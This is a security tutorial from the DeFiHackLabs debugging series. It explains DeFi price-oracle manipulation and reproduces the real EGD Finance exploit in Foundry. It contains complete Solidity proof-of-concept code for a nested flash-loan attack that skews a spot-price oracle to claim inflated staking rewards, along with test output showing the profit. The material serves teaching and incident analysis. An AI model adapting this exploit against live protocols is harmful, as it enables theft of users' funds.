# OnChain Transaction Debugging: 3. Write Your Own PoC (Price Oracle Manipulation)

Author: [▓▓▓▓▓▓](https://twitter.com/h0wsO1)

Translation: [Simon](https://www.linkedin.com/in/tysliu/) ＆ [Helen](https://www.linkedin.com/in/helen-l-25b7a41a8/) 

In [01_Tools](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/01_tools/en), we learned how to use various tools to analyze transactions in smart contracts.

In  [02_Warm](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/academy/onchain_debug/02_warmup/en/readme.md), we analyzed a transaction on a decentralized exchange using Foundry.

For this publication, we will analyze a hacker incident utilizing an oracle exploit. We’ll take you step-by-step through key function calls and then we’ll reproduce the attack together using the Foundry framework.


## Why is Reproducing Attacks Helpful?

At DeFiHackLabs we intend to promote Web3 security. We hope that when attacks happen, more people can analyze and contribute to overall security.

1. As unfortunate victims we improve our incident response and effectiveness.
2. As a whitehat we improve our ability in writing PoCs and snatch bug bounties. 
3. Aid the blue team in adjusting machine learning models. Ie., [Forta Network](https://forta.org/blog/how-fortas-predictive-ml-models-detect-attacks-before-exploitation/).
4. You’ll learn much more from reproducing the attack compared to reading post-mortems.
5. Improve your overall Solidity ”Kung Fu“.

### Some Need-to-knows Before Reproducing Transactions

1. Understanding of common attack modes. Which we have curated in [DeFiVulnLabs](https://github.com/SunWeb3Sec/DeFiVulnLabs).
2. Understanding of basic DeFi mechanisms including how smart contracts interact with each other.

### DeFi Oracle Introduction

Currently, smart contract values such as pricing and configuration cannot update themselves. To execute its contract logic, external data is sometimes required during execution. This is typically done with the following methods.

1. Through externally owned accounts. We can calculate the price based on the reserves of these accounts.
2. Use an oracle, which is maintained by someone or even yourself. With external data updated periodically. ie., price, interest rate, anything. 

* For example, in Uniswap V2, they provide the current price of the asset, which is used to determine the relative value of the asset being traded and thus execute the trade.

  * Following the figure, ETH price is the external data. The smart contract obtains it from Uniswap V2.

    We know the formula  `x * y = k` in a typical AMM. `x` ( ETH price in this case) =  `k / y`.

    So we take a look at the Uniswap V2 WETH/USDC trading pair contract. At this address `0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc`.

![UniV2PairInfo](https://user-images.githubusercontent.com/26408530/211231355-0d1fb43e-280e-4328-b71e-9797be5ce7ec.png)

* At the time of publication we see the following reserve values:

  * WETH: `33,906.6145928`  USDC: `42,346,768.252804` 

  * Formula: Applying the `x * y = k` formula will yield the price for each ETH:

     `42,346,768.252804 / 33,906.6145928 = 1248.9235`
     
   (Market prices may differ from the calculated price by a few cents. In most cases, this refers to a trading fee or a new transaction that affects the pool. This variance can be skimmed with `skim()`[^1].)

  * Solidity Pseudocode: For the lending contract to fetch the current ETH price, the pseudocode can be as the following:

```solidity=
uint256 UniV2_ETH_Reserve = WETH.balanceOf(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc);
uint256 UniV2_USDC_Reserve = USDC.balanceOf(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc);
uint256 ETH_Price = UniV2_USDC_Reserve / UniV2_ETH_Reserve;
```
   > #### Please note this method of obtaining price is easily manipulated. Please do not use it in the production code.

[^1]: Skim() :
Uniswap V2 is a decentralized exchange(DEX) that uses a liquidity pool to trade assets. It has a `skim()`function as a safety measure to protect against potential issues from customized token implementations that may change the balance of the pair contract. However, `skim()`can also be used in conjunction with price manipulation.
Please see the figure for a full explanation of Skim().
![截圖 2023-01-11 下午5 08 07](https://user-images.githubusercontent.com/107821372/211970534-67370756-d99e-4411-9a49-f8476a84bef1.png)
Image source / [Uniswap V2 Core whitepaper](https://uniswap.org/whitepaper.pdf)

* For more information, you could following bellow the resources
  * Uniswap V2 AMM mechanisms: [Smart Contract Programmer](https://www.youtube.com/watch?v=Ar4Ik7Bov0U).
  * Oracle manipulation: [WTFSolidity](https://github.com/WTFAcademy/WTF-Solidity/blob/main/S15_OracleManipulation/readme.md).

### Oracle Price Manipulation Attack Modes

Most common attack modes:

1. Alter the oracle address
    * Root cause: lack of verification mechanism
    * For example: [Rikkei Finance](https://github.com/SunWeb3Sec/DeFiHackLabs#20220415-rikkei-finance---access-control--price-oracle-manipulation)
2. Through flash loans, an attacker can drain liquidity, resulting in wrong pricing information in an oracle.
    * This is most often seen in attackers calling these functions. GetPrice、Swap、StackingReward, Transfer(with burn fee), etc.
    * Root cause: Protocols using unsafe/compromised oracles, or the oracle did not implement time-weighted average price features.
    * Example: [One Ring Finance](https://github.com/SunWeb3Sec/DeFiHackLabs#20220321-onering-finance---flashloan--price-oracle-manipulation)

    >  Protip-case 2: During code review ensure the function`balanceOf()`is well guarded.
---
## Step-by-step PoC - An Example from EGD Finance

### Step 1: Information gathering

* Upon discovery of an attack. Twitter will often be the front line of the aftermath. Top DeFi analysts will continuously publish their new findings there.

> Protip: Join the [DeFiHackLabs Discord](https://discord.gg/Fjyngakf3h) security-alert channel to receive curated updates from top DeFi analysts!

* Upon an attack incident, it is important to gather and organize the newest information. Here is a template!
  1. Transaction ID
  2. Attacker Address(EOA)
  3. Attack Contract Address
  4. Vulnerable Address
  5. Total Loss
  6. Reference Links
  7. Post-mortem Links
  8. Vulnerable snippet
  9. Audit History

> Protip: Use the [Exploit-Template.sol](/script/Exploit-template.sol) template from DeFiHackLabs.
---
### Step 2: Transaction Debugging

Based on experience, 12 hours after the attack, 90% of the attack autopsy will have been completed. It’s usually not too difficult to analyze the attack at this point.

* We will use a real case of [EGD Finance Exploit attack](https://twitter.com/BlockSecTeam/status/1556483435388350464) as an example, to help you understand :
  1. the risk in oracle manipulation.
  2. how to profit from oracle manipulation.
  3. flash loans transaction.
  4. how attackers reproduce by only 1 transaction to accomplish the attack.

* Let's use [Phalcon](https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3) from Blocksec to analyze the EGD Finance incident.
<img width="1644" alt="Screenshot 2023-01-11 at 4 59 15 PM" src="https://user-images.githubusercontent.com/107821372/211762771-d2c54800-4595-4630-9392-30431094bfca.png">

* In Ethereum EVM, you will see 3 call types to trigger remote functions:
  1. Call: Typical cross-contract function call, will often change the receiver’s storage.
  2. StaticCall: Will not change the receiver’s storage, used for fetching state and variables.
  3. DelegateCall: `msg.sender`  will remain the same, typically used in proxying calls. Please see [WTF Solidity](https://github.com/WTFAcademy/WTF-Solidity/tree/main/23_Delegatecall) for more details.

> Please note, internal function calls[^2] are not visible in Ethereum EVM.
[^2]: Internal function calls are invisible to the blockchain since they don't create any new transactions or blocks. In this way, they cannot be read by other smart contracts or show up in the blockchain transaction history.
* Further Information - Attackers Flash loan attack mode
  1. Check if the attack will be profitable. First, ensure loans can be obtained, then ensure the target has enough balance.
     - This means you will see some 'static calls' in the beginning.
  2. Use DEX or Lending Protocols to obtain a flash loan, look for the following key function calls
     - UniswapV2, Pancakeswap: `.swap()`
     - Balancer: `flashLoan()`
     - DODO: `.flashloan()`
     - AAVE: `.flashLoan()`
  3. Callbacks from flash loan protocol to attacker’s contract, look for the following key function calls
        - UniswapV2: `.uniswapV2Call()`
        - Pancakeswap: `.Pancakeswap()`
        - Balancer: `.receiveFlashLoan()`
        - DODO: `.DXXFlashLoanCall()`
        - AAVE: `.executeOperation()`
   4. Execute the attack to profit from contract weakness.
   5. Return the flash loan

### Practice: 

Identify various stages of the EGD Finance Exploit attack on [Phalcon](https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3). More specifically ‘flashloan‘, ’callback‘, ’weakness‘, and ’profit’.

`Expand Level: 3`
<img width="1898" alt="TryToDecodeFromYourEyes" src="https://user-images.githubusercontent.com/26408530/211231441-b5cd2cd8-a438-4344-b014-6b8e92ab2532.png">

>Protip: If you are unable to understand the logic of individual function calls. Try tracing through the entire call stack sequentially, take notes, and pay special attention to the money trail. You’ll have a much better understanding after doing this a few times.
<details><summary>The Answer</summary>

<img width="1589" alt="Screenshot 2023-01-12 at 1 58 02 PM" src="https://user-images.githubusercontent.com/107821372/211996295-063f4c64-957a-4896-8736-c4dbbc082272.png">

</details>


### Step 3: Reproduce code
After analysis of the attack transaction function calls, let’s now try to reproduce some code:

#### Step A. Complete fixtures.

<details><summary>Click to show the code</summary>
 
```solidity=
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : ~36,044 US$
// Attacker : 0xee0221d76504aec40f63ad7e36855eebf5ea5edd
// Attack Contract : 0xc30808d9373093fbfcec9e026457c6a9dab706a7
// Vulnerable Contract : 0x34bd6dba456bc31c2b3393e499fa10bed32a9370 (Proxy)
// Vulnerable Contract : 0x93c175439726797dcee24d08e4ac9164e88e7aee (Logic)
// Attack Tx : https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code#F1#L254
// Stake Tx : https://bscscan.com/tx/0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8

// @Analysis
// Blocksec : https://twitter.com/BlockSecTeam/status/1556483435388350464
// PeckShield : https://twitter.com/PeckShieldAlert/status/1556486817406283776

// Declaring a global variable must be of constant type.
CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
IPancakePair constant USDT_WBNB_LPPool = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
IPancakePair constant EGD_USDT_LPPool = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);
IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;

contract Attacker is Test { // simulated attacker(EOA)
    Exploit exploit = new Exploit();

    constructor() { // can also be replaced with ‘function setUp() public {}
        // Labels can be used to tag wallet addresses, making them more readable when using the 'forge test -vvvv' command."
        cheat.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
        cheat.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        cheat.label(address(pancakeRouter), "pancakeRouter");
        cheat.label(EGD_Finance, "EGD_Finance");
        cheat.label(usdt, "USDT");
        cheat.label(egd, "EGD");
        /* ------------------------------------------------------------------------------------------- */
        cheat.roll(20245539); //Note: The attack transaction must be forked from the previous block, as the victim contract state has not yet been modified at this time.
        console.log("-------------------------------- Start Exploit ----------------------------------");
    }
}
```
</details>
<br>

#### Step B. Simulate an attacker calling the harvest function
<details><summary>Click to show the code</summary>

```solidity=
contract Attacker is Test { // simulated attacker(EOA)
    Exploit exploit = new Exploit();

    constructor() {
        // Labels can be used to tag wallet addresses, making them more readable when using the 'forge test -vvvv' command.
        cheat.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
        cheat.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        cheat.label(address(pancakeRouter), "pancakeRouter");
        cheat.label(EGD_Finance, "EGD_Finance");
        cheat.label(usdt, "USDT");
        cheat.label(egd, "EGD");
        /* ------------------------------------------------------------------------------------------- */
        cheat.roll(20245539); //The attack transaction must be forked from the previous block, as the victim contract state has not yet been modified at this time.
        console.log("-------------------------------- Start Exploit ----------------------------------");
    }
 
    function testExploit() public { // To be executed by Foundry testcases, it must be named "test" at the start.
        //To observe the changes in the balance, print out the balance first, before attacking.
        emit log_named_decimal_uint("[Start] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[INFO] EGD/USDT Price before price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
        emit log_named_decimal_uint("[INFO] Current earned reward (EGD token)", IEGD_Finance(EGD_Finance).calculateAll(address(exploit)), 18);
        
        console.log("Attacker manipulating price oracle of EGD Finance...");
        exploit.harvest(); //A simulation of an EOA call attack
        console.log("-------------------------------- End Exploit ----------------------------------");
        emit log_named_decimal_uint("[End] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
    }
}
/* -------------------- Interface -------------------- */
interface IEGD_Finance {
    function calculateAll(address addr) external view returns (uint);
}
```
</details>
<br>

#### Step C. Complete part of the attack contract
<details><summary>Click to show the code</summary>

```solidity=
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // attack contract
    uint256 borrow1;

    function harvest() public {        
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //獲利了結
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        // Weakness exploit...

        // Exchange the stolen EGD Token for USDT
        console.log("Swap the profit...");
        address[] memory path = new address[](2);
        path[0] = egd;
        path[1] = usdt;
        IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(egd).balanceOf(address(this)),
            1,
            path,
            address(this),
            block.timestamp
        );

        bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //Attacker repays 2,000 USDT + 0.5% service fee
        require(suc, "Flashloan[1] payback failed");
    }
}
```

</details>
<br>


### Step 4: Analyzing the exploit

We see here the attacker called `Pancakeswap.swap()` function to take advantage of the exploit, looks like there is a second flash loan call in the call stack.
![Flashloan2](https://user-images.githubusercontent.com/26408530/211231489-4977bc1d-4ed0-45f8-b014-8de92942fe4f.png)

* Pancakeswap uses the `.pancakeCall()` interface to perform a callback on the attacker’s contract. You might be wondering how the attacker is executing different codes during each of the two callbacks.

The key is in the first flash loan, the attacker used `0x0000` in callback data.
![FlashloanCallbackData1](https://user-images.githubusercontent.com/26408530/211231501-7b8e508a-a6fe-4f28-9308-5406d0dec32f.png)

However, during the second flash loan, the attacker used `0x00` in callback data.
![FlashloanCallbackData2](https://user-images.githubusercontent.com/26408530/211231506-e76cc110-3969-486d-b917-7ddec3d46ee5.png)


Through this method, an attacking contract can determine what code to execute based on the `_data` parameter. Which could be either 0x0000 or 0x00.

* Let's continue with analyzing the second callback logic during the second flash loan.

During the second callback, the attacker only called `claimAllReward()` from EGD Finance:

![CallClaimReward](https://user-images.githubusercontent.com/26408530/211231522-a54ef929-63e3-4b9c-8f0c-e609c2055b2c.png)

Further expanding the `claimAllReward()` call stack. You’ll find EGD Finance performed a read on `0xa361-Cake-LP` for the balance of EGD Token and USDT, then transferred a large amount of EGD Token to the attacker’s contract.

![ClaimRewardDetail](https://user-images.githubusercontent.com/26408530/211231532-d9b0e7ce-ee65-48fb-a2eb-6fccbb799234.png)

<details><summary>What is the '0xa361-Cake-LP' contract?</summary>

Using Etherscan, we can see what trading pair `0xa361-Cake-LP` corresponds to.

* Option 1(faster)： View the first two largest reserve tokens of the contract in [Etherscan](https://bscscan.com/address/0xa361433e409adac1f87cdf133127585f8a93c67d) 

![Etherscan-Top2](https://user-images.githubusercontent.com/26408530/211231654-613672c0-400d-4e53-891c-4c309d8ce84c.png)
* Option 2(accurate)：[Read Contract](https://bscscan.com/address/0xa361433e409adac1f87cdf133127585f8a93c67d#readContract) Check the address of token0 and token1.

<img width="404" alt="Etherscan-ReadContract" src="https://user-images.githubusercontent.com/26408530/211231545-43777f4e-6433-4dba-b2dc-ab54cd7aaeed.png">

This indicates that `0xa361-Cake-LP` is the EGD/USDT trading pair contract。

</details>
<br>

* Let's analyze the `claimAllReward()`  function to see where the exploit lies.
<img width="1518" alt="ClaimRewardCode" src="https://user-images.githubusercontent.com/26408530/211231553-770e01d9-d809-43e1-99df-8674b0b30c8c.png">

We see that the amount of Staking Reward is based on the reward`quota` factor (Meaning the amount of staking, and duration of staking) multiplied by `getEGDPrice()` the current EGD token price.

**In return this means, the EGD Staking Reward is based on the price of the EGD Token. Less reward is yielded on a high EGD Token price and vice versa.**

* Now let's check how the `getEGDPrice()` function gets the current price of EGD Token:

<img width="529" alt="getEGDPrice" src="https://user-images.githubusercontent.com/26408530/211231565-596b32d8-cbb9-4f59-a53e-77d837d2766c.png">

We see the all-familiar equation `x * y = k` like the one we introduced earlier in the DeFi oracle introduction section, to obtain the current price. The address of the trading `pair`  is `0xa361-Cake-LP` which matches the two STATICCALLs from the transaction view.

![getEGDPrice_Static](https://user-images.githubusercontent.com/26408530/211231574-bb7a652d-3538-4ca1-859d-a30962014d44.png)

So how is the attacker taking advantage of this unsafe method of getting current prices?

The underlying mechanism is such that, from the second flash loan the attacker borrowed a large amount of USDT, therefore influencing the pool price based on the `x * y = k` formula. Before returning the loan, the `getEGDPrice()`  will be incorrect.

Reference diagram:
![CleanShot 2023-01-12 at 17 01 46@2x](https://user-images.githubusercontent.com/107821372/212027306-3a7f9a8c-4995-472c-a8c7-39e5911b531d.png)
**Conclusion:  The attacker used a flash loan to alter the liquidity of the EGD/USDT trading pair, resulting in `ClaimReward()` getting an incorrect price, allowing the attacker to obtain an obscene amount of EGD tokens.**

Finally, the attacker exchanged EGD Token using Pancakeswap for USDT, thus profiting from the attack.


---
### Step 5: Reproduce
Now that we’ve fully understood the attack, let's reproduce it:

Step D. Write the PoC code for the attack

<details><summary>Click to show the code</summary>

```solidity=
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // attack contract
    uint256 borrow1;
    uint256 borrow2;


    function harvest() public {        
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //Profit realization
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        if(keccak256(data) == keccak256("0000")) {
            console.log("Flashloan[1] received");

            console.log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve");
            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9999999925 / 10000000000; //The attacker lends 99.99999925% of the USDT liquidity of the EGD_USDT_LPPool.
            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00"); // Borrow Flashloan[2]
            console.log("Flashloan[2] payback success");

            // 漏洞利用結束, 把盜取的 EGD Token 換成 USDT
            console.log("Swap the profit...");
            address[] memory path = new address[](2);
            path[0] = egd;
            path[1] = usdt;
            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(egd).balanceOf(address(this)),
                1,
                path,
                address(this),
                block.timestamp
            );

            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //The attacker repays 2,000 USDT + 0.5% service fee.
            require(suc, "Flashloan[1] payback failed");
        } else {
            console.log("Flashloan[2] received");
            // Exploitation...
        }


    }
}
```

</details>
<br>



Step E. Write the PoC code for the second flash loan using the exploit

<details><summary>Click to show the code</summary>

```solidity=
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // attack contract
    uint256 borrow1;
    uint256 borrow2;


    function harvest() public {        
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //Gaining profit
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        if(keccak256(data) == keccak256("0000")) {
            console.log("Flashloan[1] received");

            console.log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve");
            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9999999925 / 10000000000; //The attacker lends 99.99999925% of the USDT liquidity of the EGD_USDT_LPPool.
            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00"); // Borrow Flashloan[2]
            console.log("Flashloan[2] payback success");

            // Exchange the stolen EGD Token for USDT after the exploit is over.
            console.log("Swap the profit...");
            address[] memory path = new address[](2);
            path[0] = egd;
            path[1] = usdt;
            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(egd).balanceOf(address(this)),
                1,
                path,
                address(this),
                block.timestamp
            );

            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //The attacker repays 2,000 USDT + 0.5% service fee.
            require(suc, "Flashloan[1] payback failed");
        } else {
            console.log("Flashloan[2] received");
            emit log_named_decimal_uint("[INFO] EGD/USDT Price after price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
            // -----------------------------------------------------------------
            console.log("Claim all EGD Token reward from EGD Finance contract");
            IEGD_Finance(EGD_Finance).claimAllReward();
            emit log_named_decimal_uint("[INFO] Get reward (EGD token)", IERC20(egd).balanceOf(address(this)), 18);
            // -----------------------------------------------------------------
            uint256 swapfee = amount1 * 3 / 1000;   // Attacker pay 0.3% fee to Pancakeswap
            bool suc = IERC20(usdt).transfer(address(EGD_USDT_LPPool), amount1+swapfee);
            require(suc, "Flashloan[2] payback failed");         
        }
    }
}
/* -------------------- Interface -------------------- */
interface IEGD_Finance {
    function calculateAll(address addr) external view returns (uint);
    function claimAllReward() external;
    function getEGDPrice() external view returns (uint);
}
```

</details>
<br>

Step F.Execute the code with `forge test --contracts ./src/test/EGD-Finance.exp.sol -vvv`Pay attention to the change in balances.

[DeFiHackLabs - EGD-Finance.exp.sol](https://github.com/finn79426/DeFiHackLabs/blob/main/src/test/EGD-Finance.exp.sol)

```
Running 1 test for src/test/EGD-Finance.exp.sol:Attacker
[PASS] testExploit() (gas: 537204)
Logs:
  --------------------  Pre-work, stake 10 USDT to EGD Finance --------------------
  Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8
  Attacker Stake 10 USDT to EGD Finance
  -------------------------------- Start Exploit ----------------------------------
  [Start] Attacker USDT Balance: 0.000000000000000000
  [INFO] EGD/USDT Price before price manipulation: 0.008096310933284567
  [INFO] Current earned reward (EGD token): 0.000341874999999972
  Attacker manipulating price oracle of EGD Finance...
  Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve
  Flashloan[1] received
  Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve
  Flashloan[2] received
  [INFO] EGD/USDT Price after price manipulation: 0.000000000060722331
  Claim all EGD Token reward from EGD Finance contract
  [INFO] Get reward (EGD token): 5630136.300267721935770000
  Flashloan[2] payback success
  Swap the profit...
  Flashloan[1] payback success
  -------------------------------- End Exploit ----------------------------------
  [End] Attacker USDT Balance: 18062.915446991996902763

Test result: ok. 1 passed; 0 failed; finished in 1.66s
```


Note: EGD-Finance.exp.sol from DeFiHackLabs includes a preemptive step which is staking.

This write-up does not include this step, feel free to try it yourself! Attacker Stack Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8


#### The third sharing will conclude here, if you wish to learn more, check out the links below.

---
### Learning materials

[samczsun's eth txn explorer and vscode extension](https://www.youtube.com/watch?v=HXgu239mPBc)

[Vulnerabilities in DeFi by Daniel V.F.](https://www.youtube.com/watch?v=9fcOffCg2ig)

[Tenderly.co - Debug Transaction](https://www.youtube.com/watch?v=90GN9Ut8LhU)

[Reversing The EVM: Raw Calldata](https://degatchi.com/articles/reading-raw-evm-calldata)

[https://web3sec.xrex.io/](https://web3sec.xrex.io/)

---
### Appendix

